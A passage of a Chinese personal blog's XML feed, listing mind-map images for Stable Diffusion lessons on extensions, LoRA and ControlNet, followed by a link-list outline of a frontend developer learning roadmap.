data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398721101-6ab85688-0912-43c5-bf4d-e98e08a23f45.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="SD07：局部重绘入门.png"></p><p><a name="NVOVZ"></a></p><h2 id="第-8-课：扩展安装与推荐"><a href="#第-8-课：扩展安装与推荐" class="headerlink" title="第 8 课：扩展安装与推荐 "></a><a href="https://nenly.notion.site/8-8a96710184b34e7a81557e748540e95b">第 8 课：扩展安装与推荐 </a></h2><p><a name="N9xGp"></a></p><h3 id="思维导图-7"><a href="#思维导图-7" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398730875-be52a94c-9f43-4009-86d2-e2ec982a02c6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398730875-be52a94c-9f43-4009-86d2-e2ec982a02c6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="SD08：扩展安装和使用.png"></p><p><a name="GFPmN"></a></p><h2 id="第-9-课：LoRA-原理与应用"><a href="#第-9-课：LoRA-原理与应用" class="headerlink" title=" 第 9 课：LoRA 原理与应用 "></a><a href="https://nenly.notion.site/9-LoRA-2280f711c4324e91b3e8d57d3a196cb6"> 第 9 课：LoRA 原理与应用 </a></h2><p><a name="EKglJ"></a></p><h3 id="思维导图-8"><a href="#思维导图-8" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398738193-faeac7ba-c9fd-4fe2-acd5-2d78ae3c7535.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398738193-faeac7ba-c9fd-4fe2-acd5-2d78ae3c7535.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="SD09：LoRA应用与实践.png"></p><p><a name="m9jzt"></a></p><h2 id="第-10-课：ControlNet-基础入门"><a href="#第-10-课：ControlNet-基础入门" class="headerlink" title="第 10 课：ControlNet 基础入门 "></a><a href="https://nenly.notion.site/10-ControlNet-a802ab59c48d45f8ae4ad1cfea0a0d4d">第 10 课：ControlNet 基础入门 </a></h2><p><a name="aJW9z"></a></p><h3 id="思维导图-9"><a href="#思维导图-9" class="headerlink" title="思维导图"></a>思维导图</h3><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398745663-e54ff710-5545-4ad7-91bb-09baf70d3d2c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2024/png/300943/1710398745663-e54ff710-5545-4ad7-91bb-09baf70d3d2c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="SD10：ControlNet应用与实践.png"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> stable diffusion </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stable diffusion </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端学习路线</title>
      <link href="/2023/09/25/frontend/collection/qian-duan-xue-xi-lu-xian/"/>
      <url>/2023/09/25/frontend/collection/qian-duan-xue-xi-lu-xian/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e9%b1%bc%e7%9a%ae-%e5%89%8d%e7%ab%af%e5%ad%a6%e4%b9%a0%e8%b7%af%e7%ba%bf">前端学习路线</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%89%b9%e7%82%b9">特点</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%ac%a6%e5%8f%b7%e8%a1%a8">符号表</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%a4%a7%e7%ba%b2">大纲</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%89%8d%e8%a8%80-%e5%ad%a6%e7%bc%96%e7%a8%8b%e9%9c%80%e8%a6%81%e7%9a%84%e7%89%b9%e8%b4%a8">前言 - 学编程需要的特质</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%b8%80%e3%80%81%e5%89%8d%e7%ab%af%e5%85%a5%e9%97%a8">一、前端入门</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e5%bc%80%e5%8f%91%e5%b7%a5%e5%85%b7">⭐️ 开发工具</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%b5%8f%e8%a7%88%e5%99%a8">浏览器</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%bc%96%e8%be%91%e5%99%a8">编辑器</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%96%87%e6%a1%a3%e7%ac%94%e8%ae%b0">文档笔记</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-html">⭐️ HTML</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-css">⭐️ CSS</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-javascript">⭐️ JavaScript</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-es6-%e7%89%b9%e6%80%a7">✅ ES6+ 特性</a></li></ul></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%ba%8c%e3%80%81%e5%b7%a9%e5%9b%ba%e5%9f%ba%e7%a1%80">二、巩固基础</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%89%8d%e7%ab%af%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86">前端基础知识</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%9f%ba%e7%a1%80">计算机基础</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e7%ae%97%e6%b3%95%e5%92%8c%e6%95%b0%e6%8d%ae%e7%bb%93%e6%9e%84">✅ 算法和数据结构</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%bd%91%e7%bb%9c">✅ 计算机网络</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f">✅ 操作系统</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e8%bd%af%e4%bb%b6%e5%bc%80%e5%8f%91%e5%9f%ba%e7%a1%80">软件开发基础</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e8%ae%be%e8%ae%a1%e6%a8%a1%e5%bc%8f">✅ 设计模式</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-git-%e7%89%88%e6%9c%ac%e6%8e%a7%e5%88%b6">⭐️ Git 版本控制</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-linux-%e6%9c%8d%e5%8a%a1%e5%99%a8">✅ Linux 服务器</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e6%ad%a3%e5%88%99%e8%a1%a8%e8%be%be%e5%bc%8f">✅ 正则表达式</a></li></ul></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%b8%89%e3%80%81%e5%89%8d%e7%ab%af%e5%b7%a5%e7%a8%8b%e5%8c%96">三、前端工程化</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e7%a0%94%e5%8f%91%e6%b5%81%e7%a8%8b">⭐️ 研发流程</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e4%bb%a3%e7%a0%81%e6%89%98%e7%ae%a1">⭐️ 代码托管</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-nodejs">✅ Node.JS</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e5%8c%85%e7%ae%a1%e7%90%86">⭐️ 包管理</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%bc%80%e5%8f%91%e6%a1%86%e6%9e%b6">开发框架</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%bc%80%e5%8f%91%e6%a1%86%e6%9e%b6-1">开发框架</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-css-%e6%a1%86%e6%9e%b6">⭐️ CSS 框架</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-javascript-%e6%a1%86%e6%9e%b6">⭐️ JavaScript 框架</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-vue">⭐️ Vue</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-react">⭐️ React</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9d%8c-angular">❌ Angular</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-svelte">✅ Svelte</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-umijs">✅ UmiJS</a></li></ul></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%b0%81%e8%a3%85%e5%ba%93">封装库</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e7%bb%84%e4%bb%b6%e5%ba%93">⭐️ 组件库</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%95%b0%e6%8d%ae%e5%8f%af%e8%a7%86%e5%8c%96">数据可视化</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%bb%84%e4%bb%b6%ef%bc%88%e6%8f%92%e4%bb%b6%ef%bc%89">组件（插件）</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%b7%a5%e5%85%b7%e5%ba%93">工具库</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%8a%a8%e6%95%88%e5%ba%93">动效库</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%ad%97%e4%bd%93%e5%9b%be%e6%a0%87%e5%ba%93">字体图标库</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e8%84%9a%e6%89%8b%e6%9e%b6">⭐️ 脚手架</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e5%89%8d%e7%ab%af%e6%9e%b6%e6%9e%84%e8%ae%be%e8%ae%a1">⭐️ 前端架构设计</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e6%9c%8d%e5%8a%a1%e7%ab%af%e6%b8%b2%e6%9f%93">✅ 服务端渲染</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=bff">BFF</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e5%be%ae%e5%89%8d%e7%ab%af">✅ 微前端</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=css-in-js">CSS in JS</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-css-%e6%a8%a1%e5%9d%97%e5%8c%96">⭐️ CSS 模块化</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e5%bc%80%e5%8f%91%e8%b0%83%e8%af%95">✅ 开发调试</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%86%85%e7%bd%91%e7%a9%bf%e9%80%8f">内网穿透</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-css-%e9%a2%84%e7%bc%96%e8%af%91">⭐️ CSS 预编译</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%b5%8b%e8%af%95">测试</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%b5%8b%e8%af%95%e5%88%86%e7%b1%bb">测试分类</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-mock">✅ Mock</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e6%b5%8b%e8%af%95%e6%a1%86%e6%9e%b6">✅ 测试框架</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e4%bb%a3%e7%a0%81%e8%b4%a8%e9%87%8f">✅ 代码质量</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%bc%80%e5%8f%91%e8%a7%84%e8%8c%83">开发规范</a></li><li><a 